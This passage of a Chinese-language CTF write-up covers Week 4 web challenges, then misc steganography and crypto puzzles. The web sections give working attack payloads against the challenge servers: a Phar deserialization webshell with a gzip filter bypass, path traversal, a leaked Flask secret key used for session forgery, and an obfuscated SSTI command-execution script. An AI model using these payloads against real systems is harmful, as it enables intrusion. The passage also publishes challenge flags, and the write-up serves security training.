</span><span class="z-text z-plain">    except:
</span><span class="z-text z-plain">        pass
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">    return "1"
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">if __name__ == '__main__':
</span><span class="z-text z-plain">    app.run(host='0.0.0.0',port=5000,debug=True)
</span></code></pre><p>ä¸Šä¼ åé€šè¿‡æ„é€  Payload è·å¾— flag ã€‚<pre class=z-code><code><span class="z-text z-plain">1=cat /flag
</span></code></pre><h3 id=week-4-pharone>[Week 4]PharOne<a aria-label="Anchor link for: week-4-pharone" class=zola-anchor href=#week-4-pharone style=visibility:hidden></a></h3><p>æŸ¥çœ‹æºä»£ç å¯ä»¥å‘ç°æç¤º <code>class.php</code> ï¼Œé€šè¿‡æŸ¥çœ‹å¯ä»¥å¾—åˆ°æºç å¦‚ä¸‹ã€‚<pre class=z-code><code><span class="z-text z-plain">&LT?php
</span><span class="z-text z-plain">highlight_file(__FILE__);
</span><span class="z-text z-plain">class Flag{
</span><span class="z-text z-plain">    public $cmd;
</span><span class="z-text z-plain">    public function __destruct()
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        @exec($this->cmd);
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">@unlink($_POST['file']);
</span></code></pre><p>ç»“åˆæ ‡é¢˜å¯ä»¥é€šè¿‡ Phar ååºåˆ—åŒ–æ¥å†™å…¥ WebShell ï¼Œç»è¿‡éšæœºä¸Šä¼ å‘ç°å­˜åœ¨æ–‡ä»¶ç±»å‹æ£€æµ‹ã€‚<pre class=z-code><code><span class="z-text z-plain">&LT?php
</span><span class="z-text z-plain">highlight_file(__FILE__);
</span><span class="z-text z-plain">class Flag{
</span><span class="z-text z-plain">    public $cmd;
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">$a=new Flag();
</span><span class="z-text z-plain">$a->cmd="echo \"&LT?=@eval(\\\$_POST[1]);\">/var/www/html/1.php";
</span><span class="z-text z-plain">$phar = new Phar("1.phar");
</span><span class="z-text z-plain">$phar->startBuffering();
</span><span class="z-text z-plain">$phar->setStub("&LT?php __HALT_COMPILER(); ?>");
</span><span class="z-text z-plain">$phar->setMetadata($a);
</span><span class="z-text z-plain">$phar->addFromString("test.txt", "test");
</span><span class="z-text z-plain">$phar->stopBuffering();
</span></code></pre><p>é€šè¿‡ä¸Šä¼ å‘ç°å­˜åœ¨è¿‡æ»¤ <code>!preg_match("/__HALT_COMPILER/i",FILE_CONTENTS)</code> ï¼Œå¯ä»¥é€šè¿‡ gzip å‹ç¼©è¿›è¡Œç»•è¿‡ã€‚<pre class=z-code><code><span class="z-text z-plain">$ gzip -f 1.phar
</span><span class="z-text z-plain">$ mv 1.phar.gz 1.jpg
</span></code></pre><p>ä¿®æ”¹å¥½åè¿›è¡Œä¸Šä¼ å¾—åˆ°å›æ˜¾å¦‚ä¸‹ã€‚<pre class=z-code><code><span class="z-text z-plain">Saved to: upload/f3ccdd27d2000e3f9255a7e3e2c48800.jpg
</span></code></pre><p>å†é€šè¿‡æ„é€  Payload å¦‚ä¸‹å³å¯ä¸Šä¼ æ¶æ„ WebShell ã€‚<pre class=z-code><code><span class="z-text z-plain">// class.php
</span><span class="z-text z-plain">file=phar://upload/f3ccdd27d2000e3f9255a7e3e2c48800.jpg
</span></code></pre><p>æ­¤æ—¶é€šè¿‡æ„é€  Payload å¦‚ä¸‹å³å¯è·å¾— flag ã€‚<pre class=z-code><code><span class="z-text z-plain">// 1.php
</span><span class="z-text z-plain">1=system("cat /f*");
</span></code></pre><h3 id=week-4-injectme>[Week 4]InjectMe<a aria-label="Anchor link for: week-4-injectme" class=zola-anchor href=#week-4-injectme style=visibility:hidden></a></h3><p>é™„ä»¶ï¼šDockerfile<pre class=z-code><code><span class="z-text z-plain">FROM vulhub/flask:1.1.1
</span><span class="z-text z-plain">ENV FLAG=flag{not_here}
</span><span class="z-text z-plain">  src/ /app
</span><span class="z-text z-plain">RUN mv /app/start.sh /start.sh && chmod 777 /start.sh
</span><span class="z-text z-plain">CMD [ "/start.sh" ]
</span><span class="z-text z-plain">EXPOSE 8080
</span></code></pre><p>å¯ä»¥å¾—å‡ºç«™ç‚¹ç›®å½•åœ¨ <code>/app</code> ä¸­ï¼Œé€šè¿‡æŸ¥çœ‹å›¾ç‰‡ <code>110.jpg</code> å¯ä»¥å¾—åˆ°éƒ¨åˆ†æºç ã€‚<p>å¯ä»¥å‘ç° <code>../</code> è¢«æ›¿æ¢æˆäº†ç©ºï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ç±»ä¼¼åŒå†™çš„æ–¹æ³•è¿›è¡Œç»•è¿‡ä»è€Œå®ç°è·¯å¾„ç©¿è¶Šï¼Œæ„é€  Payload å¦‚ä¸‹ã€‚<pre class=z-code><code><span class="z-text z-plain">/download?file=..././..././..././app/app.py
</span></code></pre><p>å¯ä»¥å¾—åˆ° <code>app.py</code> çš„æºç å¦‚ä¸‹ã€‚<pre class=z-code><code><span class="z-text z-plain">import os
</span><span class="z-text z-plain">import re
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">from flask import Flask, render_template, request, abort, send_file, session, render_template_string
</span><span class="z-text z-plain">from config import secret_key
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">app = Flask(__name__)
</span><span class="z-text z-plain">app.secret_key = secret_key
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">@app.route('/')
</span><span class="z-text z-plain">def hello_world():  # put application's code here
</span><span class="z-text z-plain">    return render_template('index.html')
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">@app.route("/cancanneed", methods=["GET"])
</span><span class="z-text z-plain">def cancanneed():
</span><span class="z-text z-plain">    all_filename = os.listdir('./static/img/')
</span><span class="z-text z-plain">    filename = request.args.get('file', '')
</span><span class="z-text z-plain">    if filename:
</span><span class="z-text z-plain">        return render_template('img.html', filename=filename, all_filename=all_filename)
</span><span class="z-text z-plain">    else:
</span><span class="z-text z-plain">        return f"{str(os.listdir('./static/img/'))} &LTbr> &LTa href=\"/cancanneed?file=1.jpg\">/cancanneed?file=1.jpg&LT/a>"
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">@app.route("/download", methods=["GET"])
</span><span class="z-text z-plain">def download():
</span><span class="z-text z-plain">    filename = request.args.get('file', '')
</span><span class="z-text z-plain">    if filename:
</span><span class="z-text z-plain">        filename = filename.replace('../', '')
</span><span class="z-text z-plain">        filename = os.path.join('static/img/', filename)
</span><span class="z-text z-plain">        print(filename)
</span><span class="z-text z-plain">        if (os.path.exists(filename)) and ("start" not in filename):
</span><span class="z-text z-plain">            return send_file(filename)
</span><span class="z-text z-plain">        else:
</span><span class="z-text z-plain">            abort(500)
</span><span class="z-text z-plain">    else:
</span><span class="z-text z-plain">        abort(404)
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">@app.route('/backdoor', methods=["GET"])
</span><span class="z-text z-plain">def backdoor():
</span><span class="z-text z-plain">    try:
</span><span class="z-text z-plain">        print(session.get("user"))
</span><span class="z-text z-plain">        if session.get("user") is None:
</span><span class="z-text z-plain">            session['user'] = "guest"
</span><span class="z-text z-plain">        name = session.get("user")
</span><span class="z-text z-plain">        if re.findall(
</span><span class="z-text z-plain">                r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.',
</span><span class="z-text z-plain">                name):
</span><span class="z-text z-plain">            abort(500)
</span><span class="z-text z-plain">        else:
</span><span class="z-text z-plain">            return render_template_string(
</span><span class="z-text z-plain">                'ç«Ÿç„¶ç»™&LTh1>%s&LT/h1>ä½ æ‰¾åˆ°äº†æˆ‘çš„åé—¨ï¼Œä½ ä¸€å®šæ˜¯ç½‘ç»œå®‰å…¨å¤§èµ›å† å†›å§ï¼ğŸ˜ &LTbr> é‚£ä¹ˆ ç°åœ¨è½®åˆ°ä½ äº†!&LTbr> æœ€åç¥æ‚¨ç©å¾—æ„‰å¿«!ğŸ˜' % name)
</span><span class="z-text z-plain">    except Exception:
</span><span class="z-text z-plain">        abort(500)
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">@app.errorhandler(404)
</span><span class="z-text z-plain">def page_not_find(e):
</span><span class="z-text z-plain">    return render_template('404.html'), 404
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">@app.errorhandler(500)
</span><span class="z-text z-plain">def internal_server_error(e):
</span><span class="z-text z-plain">    return render_template('500.html'), 500
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">if __name__ == '__main__':
</span><span class="z-text z-plain">    app.run('0.0.0.0', port=8080)
</span></code></pre><p>é€šè¿‡åˆ†æ backdoor å‡½æ•°å¯çŸ¥éœ€è¦è¿›è¡Œ session ä¼ªé€ æ¥ä¿®æ”¹ <code>session['user']</code> ï¼Œé€šè¿‡æºç å¯çŸ¥ <code>secret_key</code> ä½äº <code>config.py</code> ä¸­ï¼Œé€šè¿‡ä¸Šè¿°ç›¸åŒæ–¹æ³•è·å–ï¼Œå›æ˜¾å¦‚ä¸‹ã€‚<pre class=z-code><code><span class="z-text z-plain">secret_key = "y0u_n3ver_k0nw_s3cret_key_1s_newst4r"
</span></code></pre><pre class=z-code><code><span class="z-text z-plain">$ python .\flask_session_cookie_manager3.py decode -s "y0u_n3ver_k0nw_s3cret_key_1s_newst4r" -c "eyJ1c2VyIjoiZ3Vlc3QifQ.ZgfcyA.YhCEWdSzBAAgOIUh5lmFU
</span><span class="z-text z-plain">AoCqDY"
</span><span class="z-text z-plain">{'user': 'guest'}
</span></code></pre><p>æˆåŠŸ decode åï¼Œè¿˜éœ€è¦è¿›è¡Œç»•è¿‡ï¼Œç¼–å†™ä¸€ä¸ª Python è„šæœ¬å¦‚ä¸‹ã€‚<pre class=z-code><code><span class="z-text z-plain">import subprocess
</span><span class="z-text z-plain">import requests
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">payload = '&LTdiv data-gb-custom-block data-tag="set" data-i=''>&LT/div>&LTdiv data-gb-custom-block data-tag="print" data-0='24' data-1='24' data-2='24' data-3='24' data-4='24' data-5='24' data-6='24' data-7='2' data-8='2' data-9='2' data-10='g' data-11='' data-12='~i[24]*2][(' data-13='2' data-14='2' data-15='' data-16='' data-17='|select|string)[24]*2~' data-18='' data-19='' data-20='' data-21='~i[24]*2][i[24]*2~' data-22='2' data-23='2' data-24='import' data-25='~i[24]*2](' data-26='' data-27='s' data-28='p' data-29='' data-30='open' data-31='l' data-32='~' data-33='s' data-34='10' data-35='10' data-36='0' data-37='/' data-38='))[' data-39='read'>&LT/div>'
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">def getSession():
</span><span class="z-text z-plain">    command = ['python', 'flask_session_cookie_manager3.py', 'encode', '-t',
</span><span class="z-text z-plain">               "{{'user':'{0}'}}".format(payload), '-s',
</span><span class="z-text z-plain">               "y0u_n3ver_k0nw_s3cret_key_1s_newst4r"]
</span><span class="z-text z-plain">    result = subprocess.run(command, capture_output=True, text=True)
</span><span class="z-text z-plain">    output = result.stdout.strip()
</span><span class="z-text z-plain">    return output
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">a = getSession()
</span><span class="z-text z-plain">print(a)
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">url = "http://cc52e144-c6c3-4b89-abcc-472db5bf1e69.node5.buuoj.cn:81/backdoor"
</span><span class="z-text z-plain">cookies = {"session": a}
</span><span class="z-text z-plain">res = requests.get(url=url, cookies=cookies)
</span><span class="z-text z-plain">print(res.text)
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">"""
</span><span class="z-text z-plain">ç«Ÿç„¶ç»™&LTh1>app
</span><span class="z-text z-plain">bin
</span><span class="z-text z-plain">boot
</span><span class="z-text z-plain">dev
</span><span class="z-text z-plain">etc
</span><span class="z-text z-plain">home
</span><span class="z-text z-plain">lib
</span><span class="z-text z-plain">lib64
</span><span class="z-text z-plain">media
</span><span class="z-text z-plain">mnt
</span><span class="z-text z-plain">opt
</span><span class="z-text z-plain">proc
</span><span class="z-text z-plain">root
</span><span class="z-text z-plain">run
</span><span class="z-text z-plain">sbin
</span><span class="z-text z-plain">srv
</span><span class="z-text z-plain">start.sh
</span><span class="z-text z-plain">sys
</span><span class="z-text z-plain">tmp
</span><span class="z-text z-plain">usr
</span><span class="z-text z-plain">var
</span><span class="z-text z-plain">y0U3_f14g_1s_h3re
</span><span class="z-text z-plain">&LT/h1>ä½ æ‰¾åˆ°äº†æˆ‘çš„åé—¨ï¼Œä½ ä¸€å®šæ˜¯ç½‘ç»œå®‰å…¨å¤§èµ›å† å†›å§ï¼ğŸ˜ &LTbr> é‚£ä¹ˆ ç°åœ¨è½®åˆ°ä½ äº†!&LTbr> æœ€åç¥æ‚¨ç©å¾—æ„‰å¿«!ğŸ˜
</span><span class="z-text z-plain">"""
</span></code></pre><p>å‘ç°æˆåŠŸç»•è¿‡å¹¶ä¸”è·å¾— flag æ–‡ä»¶å <code>y0U3_f14g_1s_h3re</code> ï¼Œé€šè¿‡ä¿®æ”¹è„šæœ¬å¦‚ä¸‹å³å¯å¾—åˆ° flag ã€‚<pre class=z-code><code><span class="z-text z-plain">payload = '&LTdiv data-gb-custom-block data-tag="set" data-i=''>&LT/div>&LTdiv data-gb-custom-block data-tag="print" data-0='24' data-1='24' data-2='24' data-3='24' data-4='24' data-5='24' data-6='24' data-7='2' data-8='2' data-9='2' data-10='g' data-11='' data-12='~i[24]*2][(' data-13='2' data-14='2' data-15='' data-16='' data-17='|select|string)[24]*2~' data-18='' data-19='' data-20='' data-21='~i[24]*2][i[24]*2~' data-22='2' data-23='2' data-24='import' data-25='~i[24]*2](' data-26='' data-27='s' data-28='p' data-29='' data-30='open' data-31='c' data-32='~' data-33='at' data-34='10' data-35='10' data-36='0' data-37='/y0U3_f14g_1s_h3re' data-38='))[' data-39='read'>&LT/div>'
</span></code></pre><h2 id=misc>Misc<a aria-label="Anchor link for: misc" class=zola-anchor href=#misc style=visibility:hidden></a></h2><h3 id=week-1-cyberchef-s-secret>[Week 1]CyberChefâ€™s Secret<a aria-label="Anchor link for: week-1-cyberchef-s-secret" class=zola-anchor href=#week-1-cyberchef-s-secret style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">æ¥ç­¾åˆ°å§ï¼ä¸‹é¢è¿™ä¸ªå°±æ˜¯flagï¼Œä¸è¿‡å®ƒçœ‹èµ·æ¥å¥½åƒæ€ªæ€ªçš„:-)
</span><span class="z-text z-plain">M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=
</span></code></pre><p>CyberChef ä¸€æŠŠæ¢­ï¼Œflag å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">flag{Base_15_S0_Easy_^_^}
</span></code></pre><h3 id=week-1-ji-mi-tu-pian>[Week 1]æœºå¯†å›¾ç‰‡<a aria-label="Anchor link for: week-1-ji-mi-tu-pian" class=zola-anchor href=#week-1-ji-mi-tu-pian style=visibility:hidden></a></h3><p>é€šè¿‡ zteg å¯ä»¥å¾—åˆ° flagã€‚<pre class=z-code><code><span class="z-text z-plain">â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]
</span><span class="z-text z-plain">â””â”€$ zsteg secret.png
</span><span class="z-text z-plain">b1,r,lsb,xy         .. text: ":=z^rzwPQb"
</span><span class="z-text z-plain">b1,g,lsb,xy         .. file: OpenPGP Public Key
</span><span class="z-text z-plain">b1,b,lsb,xy         .. file: OpenPGP Secret Key
</span><span class="z-text z-plain">b1,rgb,lsb,xy       .. text: "flag{W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece}"
</span><span class="z-text z-plain">b3,b,lsb,xy         .. file: very old 16-bit-int big-endian archive
</span><span class="z-text z-plain">b4,bgr,msb,xy       .. file: MPEG ADTS, layer I, v2, 112 kbps, 24 kHz, JntStereo
</span></code></pre><h3 id=week-1-liu-liang-sha-yu>[Week 1]æµé‡ï¼é²¨é±¼ï¼<a aria-label="Anchor link for: week-1-liu-liang-sha-yu" class=zola-anchor href=#week-1-liu-liang-sha-yu style=visibility:hidden></a></h3><p>ç”¨ WireShark æ‰“å¼€ååœ¨è¿‡æ»¤å™¨ä¸­è¾“å…¥ <code>http.response.code==200</code> å¯ä»¥å¾—åˆ°æ‰€æœ‰æˆåŠŸè®¿é—®çš„ http è¯·æ±‚ã€‚<p>é€šè¿‡ä¸€ä¸ªä¸€ä¸ªçœ‹å¯ä»¥å‘ç°ä¸€ä¸ªç‰¹æ®Šçš„è¯·æ±‚ï¼Œå¦‚ä¸‹å›¾<p>å¯ä»¥å‘ç°è¿™æ˜¯è¯·æ±‚ flag å¹¶ä¸”å°† flag ä»¥ base64 ç¼–ç çš„å½¢æ€è¾“å‡ºï¼Œé€šè¿‡å°†å€¼è¿›è¡Œ base64 è§£ç å³å¯å¾—åˆ° flagã€‚<pre class=z-code><code><span class="z-text z-plain">flag{Wri35h4rk_1s_u53ful_b72a609537e6}
</span></code></pre><h3 id=week-1-ya-suo-bao-men>[Week 1]å‹ç¼©åŒ…ä»¬<a aria-label="Anchor link for: week-1-ya-suo-bao-men" class=zola-anchor href=#week-1-ya-suo-bao-men style=visibility:hidden></a></h3><p>é€šè¿‡ binwalk å¯ä»¥çŸ¥é“è¿™æ˜¯ä¸ª zip å‹ç¼©åŒ…ï¼Œç”¨ 010 æ‰“å¼€åå‘ç°ç¼ºå°‘äº†æ–‡ä»¶å¤´ï¼Œéœ€è¦è¿›è¡Œä¿®æ”¹ï¼Œå¦‚ä¸‹å›¾ã€‚<p>ä¿®æ”¹åå°†åç¼€åä¿®æ”¹ä¸º zip ï¼Œè§£å‹å¾—åˆ° flag.zip ä½†æ‰“å¼€å‹ç¼©åŒ…ä¼šæç¤ºå‹ç¼©åŒ…æ•°æ®é”™è¯¯ - è¯¥æ–‡ä»¶å·²æŸåï¼Œå†çœ‹çœ‹å…¨å±€æ–¹å¼ä½æ ‡è®°æ˜¯å¦æœ‰é”™ã€‚<blockquote><p>https://mp.weixin.qq.com/s?__biz=MzAwNDcwMDgzMA==&mid=2651042332&idx=7&sn=ff5bb33bb0f49470a9140976d9ced3fa</blockquote><p>é€šè¿‡ 010 å¯ä»¥çœ‹åˆ°å‹ç¼©æºæ–‡ä»¶æ•°æ®çš„å…¨å±€æ–¹å¼ä½æ ‡è®°ä¸º <code>09 00</code> ï¼Œå‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®° <code>00 00</code> ï¼Œå°†å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®°ä¹Ÿä¿®æ”¹ä¸º <code>09 00</code> å†æ‰“å¼€å‹ç¼©åŒ…å‘ç°å‹ç¼©åŒ…æ­£å¸¸äº†ã€‚<p>åœ¨å‹ç¼©åŒ…æ³¨é‡Šä¸­å­˜åœ¨ä¸€ä¸² base64 ç¼–ç å†…å®¹å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg==
</span></code></pre><p>è§£ç å†…å®¹å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">I like six-digit numbers because they are very concise and easy to remember.
</span></code></pre><p>è¯´æ˜å¯†ç åº”è¯¥ä¸º 6 ä¸ªæ•°å­—ï¼Œç”¨ ARCHPR è¿›è¡Œçˆ†ç ´å³å¯å¾—åˆ°å¯†ç ä¸º <code>232311</code> ï¼Œè§£å‹åå³å¯å¾—åˆ° flag<pre class=z-code><code><span class="z-text z-plain">flag{y0u_ar3_the_m4ter_of_z1111ppp_606a4adc}
</span></code></pre><h3 id=week-1-kong-bai-ge>[Week 1]ç©ºç™½æ ¼<a aria-label="Anchor link for: week-1-kong-bai-ge" class=zola-anchor href=#week-1-kong-bai-ge style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">  
</span></code></pre><p>ä½¿ç”¨ VSCode æ‰“å¼€å¯ä»¥å‘ç°è¿™æ˜¯ç”± <code>æ¢è¡Œç¬¦</code> ã€<code>åˆ¶è¡¨ç¬¦</code> å’Œ <code>ç©ºæ ¼</code> ç»„æˆçš„å†…å®¹ï¼Œé€šè¿‡ç™¾åº¦å‘ç°æ˜¯ whitespace è¯­è¨€ã€‚<blockquote><p>https://www.w3cschool.cn/tryrun/runcode?lang=whitespace</blockquote><p>é€šè¿‡åœ¨çº¿å·¥å…·å³å¯å¾—åˆ° flag å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">flag{w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04}
</span></code></pre><h3 id=week-1-yin-mi-de-yan-jing>[Week 1]éšç§˜çš„çœ¼ç›<a aria-label="Anchor link for: week-1-yin-mi-de-yan-jing" class=zola-anchor href=#week-1-yin-mi-de-yan-jing style=visibility:hidden></a></h3><p>ä½¿ç”¨ SilentEye è¿›è¡Œ Decode å³å¯å¾—åˆ° flagï¼Œå¯†é’¥ç”¨çš„æ˜¯é»˜è®¤çš„ã€‚<pre class=z-code><code><span class="z-text z-plain">flag{R0ck1ng_y0u_63b0dc13a591}
</span></code></pre><h3 id=week-2-xin-jian-wordwen-dang>[Week 2]æ–°å»ºWordæ–‡æ¡£<a aria-label="Anchor link for: week-2-xin-jian-wordwen-dang" class=zola-anchor href=#week-2-xin-jian-wordwen-dang style=visibility:hidden></a></h3><p>http://hi.pcmoe.net/buddha.html<h2 id=crypto>Crypto<a aria-label="Anchor link for: crypto" class=zola-anchor href=#crypto style=visibility:hidden></a></h2><h3 id=week-1-brainfuck>[Week 1]brainfuck<a aria-label="Anchor link for: week-1-brainfuck" class=zola-anchor href=#week-1-brainfuck style=visibility:hidden></a></h3><p>å¯†æ–‡å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">++++++++[>>++>++++>++++++>++++++++>++++++++++>++++++++++++>++++++++++++++>++++++++++++++++>++++++++++++++++++>++++++++++++++++++++>++++++++++++++++++++++>++++++++++++++++++++++++>++++++++++++++++++++++++++>++++++++++++++++++++++++++++>++++++++++++++++++++++++++++++<<<<<<<<<<<<<<<&LT-]>>>>>>>++++++.>----.&LT-----.>-----.>-----.<<&LT-.>>++..<.>.++++++.....------.<.>.<<<<<+++.>>>>+.<<<+++++++.>>>+.<<&LT-------.>>>-.<<<+.+++++++.--..>>>>---.-.<<<&LT-.+++.>>>>.<<<&LT-------.+.>>>>>++.
</span></code></pre><blockquote><p>https://www.splitbrain.org/services/ook</blockquote><pre class=z-code><code><span class="z-text z-plain">flag{Oiiaioooooiai#b7c0b1866fe58e12}
</span></code></pre><h3 id=week-1-caesar-s-secert>[Week 1]Caesarâ€™s Secert<a aria-label="Anchor link for: week-1-caesar-s-secert" class=zola-anchor href=#week-1-caesar-s-secert style=visibility:hidden></a></h3><p>å¯†æ–‡å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">kqfl{hf3x4w'x_h1umjw_n5_a4wd_3fed}
</span></code></pre><blockquote><p>https://www.dcode.fr/caesar-cipher</blockquote><pre class=z-code><code><span class="z-text z-plain">flag{ca3s4r's_c1pher_i5_v4ry_3azy}
</span></code></pre><h3 id=week-1-fence>[Week 1]Fence<a aria-label="Anchor link for: week-1-fence" class=zola-anchor href=#week-1-fence style=visibility:hidden></a></h3><p>å¯†æ–‡å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">fa{ereigtepanet6680}lgrodrn_h_litx#8fc3
</span></code></pre><p>æ …æ å¯†ç ï¼Œä½¿ç”¨ CyberChef å¯ä»¥è§£å‡ºæ¥<pre class=z-code><code><span class="z-text z-plain">#recipe=Rail_Fence_Cipher_Decode(2,0)&input=ZmF7ZXJlaWd0ZXBhbmV0NjY4MH1sZ3JvZHJuX2hfbGl0eCM4ZmMz
</span></code></pre><pre class=z-code><code><span class="z-text z-plain">flag{reordering_the_plaintext#686f8c03}
</span></code></pre><h3 id=week-1-vigenere>[Week 1]VigenÃ¨re<a aria-label="Anchor link for: week-1-vigenere" class=zola-anchor href=#week-1-vigenere style=visibility:hidden></a></h3><p>å¯†æ–‡å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">pqcq{qc_m1kt4_njn_5slp0b_lkyacx_gcdy1ud4_g3nv5x0}
</span></code></pre><blockquote><p>https://www.dcode.fr/vigenere-cipher</blockquote><p>ç»´å‰å°¼äºšå¯†ç è§£å¯†ï¼Œå°†å¯†æ–‡ä¸¢è¿›ä¸Šè¿°é“¾æ¥ä¸­ï¼Œå¹¶è®¾ç½®<pre class=z-code><code><span class="z-text z-plain">Knowing a plaintext word: flag{
</span></code></pre><p>å¯ä»¥å‘ç°å½“ Key å‰ä¸‰ä½ä¸º <code>KFC</code> æ—¶å­˜åœ¨ <code>flag{</code> ï¼Œæ•…å°è¯•è®© Key å°±ç­‰äº <code>KFC</code> ï¼Œå‘ç°å°±æ˜¯ flagã€‚<pre class=z-code><code><span class="z-text z-plain">flag{la_c1fr4_del_5ign0r_giovan_batt1st4_b3ll5s0}
</span></code></pre><h3 id=week-1-babyencoding>[Week 1]babyencoding<a aria-label="Anchor link for: week-1-babyencoding" class=zola-anchor href=#week-1-babyencoding style=visibility:hidden></a></h3><p>å¯†æ–‡å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">part 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=
</span><span class="z-text z-plain">part 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=
</span><span class="z-text z-plain">part 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&LTR-C`Q9F8S87T`
</span></code></pre><p>å‰ä¸¤ä¸ªç”¨ CyberChef å¯ä»¥ä¸€æŠŠæ¢­ï¼Œç»“æœå¦‚ä¸‹ã€‚<pre class=z-code><code><span class="z-text z-plain">part 1 of flag: flag{dazzling_encoding#4e0ad4
</span><span class="z-text z-plain">part 2 of flag: f0ca08d1e1d0f10c0c7afe422fea7
</span></code></pre><p>ç¬¬ä¸‰éƒ¨åˆ†ä½¿ç”¨çš„æ˜¯ UUEncode ç¼–ç <blockquote><p>http://www.atoolbox.net/Tool.php?Id=731</blockquote><p>è§£å¯†åå¯ä»¥å¾—åˆ°ç¬¬ä¸‰éƒ¨åˆ†<pre class=z-code><code><span class="z-text z-plain">part 3 of flag: c55192c992036ef623372601ff3a}
</span></code></pre><h3 id=week-1-small-d>[Week 1]Small d<a aria-label="Anchor link for: week-1-small-d" class=zola-anchor href=#week-1-small-d style=visibility:hidden></a></h3><blockquote><p>https://github.com/pablocelayes/rsa-wiener-attack</blockquote><p>é¢˜ç›®ä¸­çš„ e å¾ˆå¤§ï¼Œè¯´æ˜ d å°±ä¼šå¾ˆå°ï¼Œé€šè¿‡ Wiener æ”»å‡»æ¥è§£å‡º dã€‚<pre class=z-code><code><span class="z-text z-plain">from Crypto.Util.number import long_to_bytes
</span><span class="z-text z-plain">from RSAwienerHacker import hack_RSA
</span><span class="z-text z-plain">e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825
</span><span class="z-text z-plain">n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433
</span><span class="z-text z-plain">c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248
</span><span class="z-text z-plain">d = hack_RSA(e, n)
</span><span class="z-text z-plain">print(d)
</span><span class="z-text z-plain">m = pow(c, d, n)
</span><span class="z-text z-plain">print(long_to_bytes(m))
